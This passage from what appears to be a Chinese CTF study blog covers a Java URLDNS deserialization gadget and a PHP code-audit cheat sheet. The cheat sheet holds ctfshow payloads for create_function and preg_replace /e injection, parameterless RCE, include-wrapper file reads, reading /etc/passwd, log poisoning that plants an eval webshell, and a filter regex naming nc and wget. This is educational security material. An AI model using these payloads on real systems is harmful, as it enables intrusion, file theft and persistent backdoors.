HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, String&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//这里不能发起请求，通过反射将url对象的hashcode改成不是一</span></span><br><span class="line">        filed.set(url1, <span class="number">123</span>);</span><br><span class="line">        <span class="comment">//同样这里需要通过反射改成一才能继续执行</span></span><br><span class="line">        hashMap.put(url1, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        filed.set(url1, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">runReadobject</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(outputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(outputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;  </span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">data</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line"><span class="type">ObjectOutput</span> <span class="variable">oos</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(data);  </span><br><span class="line">oos.writeObject(obj);  </span><br><span class="line">oos.flush();  </span><br><span class="line">oos.close();  </span><br><span class="line">System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">URL url=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://28bc736c-f956-4721-8651-efc6e2beb94a.challenge.ctf.show/&quot;</span>);  </span><br><span class="line">Class&lt;?&gt; c=url.getClass();  </span><br><span class="line">Field hashcode=c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);  </span><br><span class="line">hashcode.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">hashcode.set(url,<span class="number">1</span>);  </span><br><span class="line">HashMap&lt;URL,Integer&gt; h = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();  </span><br><span class="line">h.put(url,<span class="number">1</span>);  </span><br><span class="line">hashcode.set(url,-<span class="number">1</span>);  </span><br><span class="line">serialize(h);  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>php代码审计</title>
    <url>/2024/04/03/php%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<p> php代码审计小结</p>
<h1 id="php函数"><a href="#php函数" class="headerlink" title="php函数"></a>php函数</h1><p>常用输出函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 输出一个字符串或变量，但是不能输出数组。</span><br><span class="line"></span><br><span class="line">print_r()  输出一个数组。</span><br><span class="line"></span><br><span class="line">var_dump() 输出一个变量的结构，这个变量包含普通变量，数组，对象等</span><br><span class="line"></span><br><span class="line">get_defined_vars(void)此函数返回一个包含当前可用的变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</span><br></pre></td></tr></table></figure>

<p>在函数中使用此函数可以调试函数中的变量，而不会返回其他的变量。</p>
<p><a href="https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html">https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html</a></p>
<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>systemsystem()exec()shell_exec()passthru()pcntl_exec()popen()proc_open()</p>
<p>用于打开一个到外部命令的管道。允许你与外部命令进行读或写操作（但不同时支持两者）。返回一个文件指针，可用于进一步的 fread 或 fwrite 操作。使用 pclose 来关闭管道并获取命令的退出状态。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pcntl_exec(&quot;/bin/cat&quot;,array(&quot;/etc/passwd));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=popen(&quot;bin/cat,/etc/passwd&quot;,&quot;r&quot;);$b=fread($a,2096);echo $b;pclose($a);</span><br></pre></td></tr></table></figure>

<p>ob_start() 是 PHP 的一个函数，用于开启输出缓冲。这意味着脚本的输出（如 echo）不会立即发送到浏览器，而是存储在内部缓冲区中。这允许在输出发送到浏览器前对其进行修改。使用 ob_end_flush() 来发送缓冲区内容至浏览器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start(&quot;system&quot;);</span><br><span class="line">echo &quot;whoami&quot;;</span><br><span class="line">ob_end_flush();?&gt;</span><br></pre></td></tr></table></figure>



<h2 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h2><p>遍历 <code>array</code> 数组中的每个值，并将每个值传递给 <code>callback</code> 回调函数。 如果 <code>callback</code> 回调函数返回 **<code>true</code>**，则将 <code>array</code> 数组中的当前值返回到结果 <a href="https://www.php.net/manual/zh/language.types.array.php">array</a> 数组中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array_filter(array $array,  $callback )</span><br><span class="line">array   要遍历的数组</span><br><span class="line">callback  使用的回调函数</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$array1</span>=<span class="keyword">array</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$func</span> =<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">array_filter</span>(<span class="variable">$array1</span>,<span class="variable">$func</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><p>回调函数的一些使用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$parameters</span> = <span class="variable">$_GET</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$action</span>, ...<span class="variable">$parameters</span>);</span><br><span class="line">...<span class="variable">$parameters</span>的值为<span class="keyword">array</span>(<span class="number">1</span>) &#123; [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;whoami&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=system&amp;1=whoami</span><br></pre></td></tr></table></figure>

<p>PHP 在用户自定义函数中支持可变数量的参数列表。由 <code>...</code> 语法实现。</p>
<p>包含 <code>...</code> 的参数，会转换为指定参数变量的一个 array：</p>
<p><strong>unset()</strong> 函数用于销毁给定的变量</p>
<h3 id="拓展2"><a href="#拓展2" class="headerlink" title="拓展2"></a>拓展2</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$parameters</span> = <span class="variable">$_GET</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$action</span>, <span class="variable">$parameters</span>)(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=current&amp;a=current</span><br><span class="line">post:a[]=system&amp;b=whoami</span><br></pre></td></tr></table></figure>

<h3 id="拓展3"><a href="#拓展3" class="headerlink" title="拓展3"></a>拓展3</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class A&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$parameters</span> = <span class="variable">$_GET</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$action</span>, <span class="variable">$parameters</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=A::f</span><br><span class="line">post:a=whoami</span><br></pre></td></tr></table></figure>

<h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>ctfshow 147</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">GET ?show=;&#125;;system(&#x27;grep flag flag.php&#x27;);/*</span><br><span class="line">POSOT ctf=%5ccreate_function</span><br></pre></td></tr></table></figure>

<h2 id="pre-replace"><a href="#pre-replace" class="headerlink" title="pre_replace"></a>pre_replace</h2><p><a href="https://www.sqlsec.com/2020/07/preg_replace.html">PHP preg_系列漏洞小结 | 国光 (sqlsec.com)</a></p>
<p>php5.5 之后废除</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(.*)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>另一个版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo preg_replace($_GET[&#x27;a&#x27;],$_GET[&#x27;b&#x27;],$_GET[&#x27;c&#x27;]);</span><br></pre></td></tr></table></figure>

<p>传入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=/zhou/e&amp;b=system(&#x27;cat /flag&#x27;)&amp;c=zhou</span><br></pre></td></tr></table></figure>



<h2 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h2><p><strong>array_map()</strong> 返回一个 <a href="https://www.php.net/manual/zh/language.types.array.php">array</a>，包含将 <code>array</code> 的相应值作为回调的参数顺序调用 <code>callback</code> 后的结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cube</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$n</span> * <span class="variable">$n</span> * <span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;cube&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 1</span><br><span class="line">    [1] =&gt; 8</span><br><span class="line">    [2] =&gt; 27</span><br><span class="line">    [3] =&gt; 64</span><br><span class="line">    [4] =&gt; 125</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>命令执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$func</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">    <span class="variable">$old_array</span>[<span class="number">0</span>] = <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="variable">$new_array</span> = <span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>,<span class="variable">$old_array</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$new_array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag:/flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shaw&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$shaw</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;shaw&#x27;</span>];</span><br><span class="line">    <span class="variable">$root</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;root&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z_]*$/isD&#x27;</span>,<span class="variable">$shaw</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/rm|ch|nc|net|ex|\-|de|cat|tac|strings|h|wget|\?|cp|mv|\||so|\$/i&#x27;</span>,<span class="variable">$root</span>))&#123;</span><br><span class="line">            <span class="variable">$shaw</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$root</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Almost there^^&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?root=;&#125;system(&#x27;ca\t /f*&#x27;);/*</span><br><span class="line">shaw=create_function</span><br></pre></td></tr></table></figure>



<p>这里使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=print_r(scandir(dirname(__FILE__)));查看当前目录下文件</span><br><span class="line">然后找到flag.php</span><br><span class="line">print_r(next(array_reverse(scandir(dirname(__FILE__)))));</span><br><span class="line">之后高亮显示即可</span><br><span class="line">c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));</span><br></pre></td></tr></table></figure>

<p>方法二</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>方法三</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=show_source(session_id(session_start()));，别忘了修改Cookie: PHPSESSID=flag.php</span><br></pre></td></tr></table></figure>

<p>方法四</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=session_start();system(session_id());</span><br><span class="line">passid=ls</span><br></pre></td></tr></table></figure>

<p>方法五</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=show_source(next(array_reverse(scandir(pos(localeconv()))))); </span><br></pre></td></tr></table></figure>

<p>方法六</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readfile(array_rand(array_flip(scandir(current(localeconv())))));</span><br><span class="line">或者</span><br><span class="line">readfile(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>方法七</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(var_dump(end(getallheaders())));</span><br></pre></td></tr></table></figure>

<p>方法八</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=eval(end(current(get_defined_vars())));&amp;a=system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="无参rce"><a href="#无参rce" class="headerlink" title="无参rce"></a>无参rce</h2><p><strong><code>__FILE__</code></strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo __FILE__ ; // 取得当前文件的绝对地址，结果：D:\www\test.php </span><br><span class="line"></span><br><span class="line">echo dirname(__FILE__); // 取得当前文件所在的绝对目录，结果：D:\www\ </span><br><span class="line"></span><br><span class="line">echo dirname(dirname(__FILE__)); //取得当前文件的上一层目录名，结果：D:\ </span><br></pre></td></tr></table></figure>

<p><strong>scandir</strong></p>
<p>(PHP 5, PHP 7, PHP 8)</p>
<p> 列出指定路径中的文件和目录，返回 array，包含有 <code>directory</code> 中的文件和目录。</p>
<p><strong>array_reverse()</strong> 接受数组 <code>array</code> 作为输入并返回一个单元为相反顺序的新数组。</p>
<p><strong>next</strong>  将数组中的内部指针向前移动一位</p>
<p>示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$transport = array(&#x27;foot&#x27;, &#x27;bike&#x27;, &#x27;car&#x27;, &#x27;plane&#x27;);</span><br><span class="line">$mode = current($transport); // $mode = &#x27;foot&#x27;;</span><br><span class="line">$mode = next($transport);    // $mode = &#x27;bike&#x27;;</span><br><span class="line">$mode = next($transport);    // $mode = &#x27;car&#x27;;</span><br><span class="line">$mode = prev($transport);    // $mode = &#x27;bike&#x27;;</span><br><span class="line">$mode = end($transport);     // $mode = &#x27;plane&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>session_id()</strong> </p>
<p>返回当前会话ID。 如果当前没有会话，则返回空字符串（<code>&quot;&quot;</code>）。失败时返回 **<code>false</code>**。</p>
<p><strong>localeconv()</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [decimal_point] =&gt; .</span><br><span class="line">    [thousands_sep] =&gt;</span><br><span class="line">    [int_curr_symbol] =&gt; EUR</span><br><span class="line">    [currency_symbol] =&gt; €</span><br><span class="line">    [mon_decimal_point] =&gt; ,</span><br><span class="line">    [mon_thousands_sep] =&gt;</span><br><span class="line">    [positive_sign] =&gt;</span><br><span class="line">    [negative_sign] =&gt; -</span><br><span class="line">    [int_frac_digits] =&gt; <span class="number">2</span></span><br><span class="line">    [frac_digits] =&gt; <span class="number">2</span></span><br><span class="line">    [p_cs_precedes] =&gt; <span class="number">1</span></span><br><span class="line">    [p_sep_by_space] =&gt; <span class="number">1</span></span><br><span class="line">    [n_cs_precedes] =&gt; <span class="number">1</span></span><br><span class="line">    [n_sep_by_space] =&gt; <span class="number">1</span></span><br><span class="line">    [p_sign_posn] =&gt; <span class="number">1</span></span><br><span class="line">    [n_sign_posn] =&gt; <span class="number">2</span></span><br><span class="line">    [grouping] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">        )</span><br><span class="line">    [mon_grouping] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; <span class="number">3</span></span><br><span class="line">            [<span class="number">1</span>] =&gt; <span class="number">3</span></span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>也就是返回  .</p>
<p><strong>readfile</strong></p>
<p>读取文件并写入到输出缓冲。</p>
<p><strong>getcwd()取得当前工作目录。</strong></p>
<p>**pos 此函数是该函数的别名：current()**\</p>
<p><strong>array_flip()</strong> 返回一个反转后的 array，例如 <code>array</code> 中的键名变成了值，而 <code>array</code> 中的值成了键名。</p>
<p><strong>getallheaders</strong> ()</p>
<p>获取当前请求的所有请求头信息。</p>
<p>使用getallheaders()其实具有局限性，因为他是apache的函数，如果目标中间件不为apache，那么这种方法就会失效</p>
<p><strong>get_defined_vars()</strong></p>
<p>此函数返回多维数组。包含调用 <strong>get_defined_vars()</strong> 作用域内所有已定义的变量、环境变量、服务器变量、用户定义变量列表。</p>
<p><strong>session_id()</strong></p>
<p>可以获取PHPSESSID的值</p>
<h3 id="读取目录："><a href="#读取目录：" class="headerlink" title="读取目录："></a>读取目录：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(scandir(&quot;/&quot;));</span><br><span class="line">print_r(glob(&quot;*&quot;)); // 列当前目录</span><br><span class="line">print_r(glob(&quot;/*&quot;)); // 列根目录</span><br><span class="line">print_r(scandir(&quot;.&quot;));</span><br><span class="line">print_r(scandir(&quot;/&quot;));</span><br><span class="line">$d=opendir(&quot;.&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;</span><br><span class="line">$d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read()))&#123;echo$f.&quot;\n&quot;;&#125;</span><br><span class="line">$a=glob(&quot;/*&quot;);foreach($a as $value)&#123;echo $value.&quot;   &quot;;&#125;</span><br><span class="line">$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</span><br></pre></td></tr></table></figure>

<h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file($filename);</span><br><span class="line"></span><br><span class="line">show_source($filename);</span><br><span class="line"></span><br><span class="line">print_r(php_strip_whitespace($filename));</span><br><span class="line"></span><br><span class="line">print_r(file_get_contents($filename));</span><br><span class="line"></span><br><span class="line">readfile($filename);</span><br><span class="line"></span><br><span class="line">print_r(file($filename)); // var_dump</span><br><span class="line"></span><br><span class="line">fread(fopen($filename,&quot;r&quot;), $size);</span><br><span class="line"></span><br><span class="line">include($filename); // 非php代码</span><br><span class="line"></span><br><span class="line">include_once($filename); // 非php代码</span><br><span class="line"></span><br><span class="line">require($filename); // 非php代码</span><br><span class="line"></span><br><span class="line">require_once($filename); // 非php代码</span><br><span class="line"></span><br><span class="line">print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));</span><br><span class="line"></span><br><span class="line">print_r(fgets(fopen($filename, &quot;r&quot;))); // 读取一行</span><br><span class="line"></span><br><span class="line">fpassthru(fopen($filename, &quot;r&quot;)); // 从当前位置一直读取到 EOF</span><br><span class="line"></span><br><span class="line">print_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));</span><br><span class="line"></span><br><span class="line">print_r(fgetss(fopen($filename, &quot;r&quot;))); // 从文件指针中读取一行并过滤掉 HTML 标记</span><br><span class="line"></span><br><span class="line">print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));</span><br><span class="line"></span><br><span class="line">print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组</span><br></pre></td></tr></table></figure>

<h2 id="括号过滤"><a href="#括号过滤" class="headerlink" title="括号过滤"></a>括号过滤</h2><p>nclude不用括号，分号可以用?&gt;代替,伪协议文件包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[0]?&gt;&amp;0=data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br><span class="line">c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span><br></pre></td></tr></table></figure>

<p>方法二</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[0]?&gt;&amp;0=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>方法三,日志包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[0]?&gt;&amp;0=/var/log/nginx/access.log</span><br><span class="line">User-Agent: &lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="eval-注释符绕过"><a href="#eval-注释符绕过" class="headerlink" title="eval 注释符绕过"></a>eval 注释符绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0a %0d ?&gt; </span><br></pre></td></tr></table></figure>

<h1 id="php函数绕过"><a href="#php函数绕过" class="headerlink" title="php函数绕过"></a>php函数绕过</h1><p>md5(Array()) &#x3D; null<br>sha1(Array()) &#x3D; null<br>ereg(pattern,Array()) &#x3D;null<br>preg_match(pattern,Array()) &#x3D; false<br>strcmp(Array(), “abc”) &#x3D;null<br>strpos(Array(),“abc”) &#x3D; null<br>strlen(Array()) &#x3D; null</p>
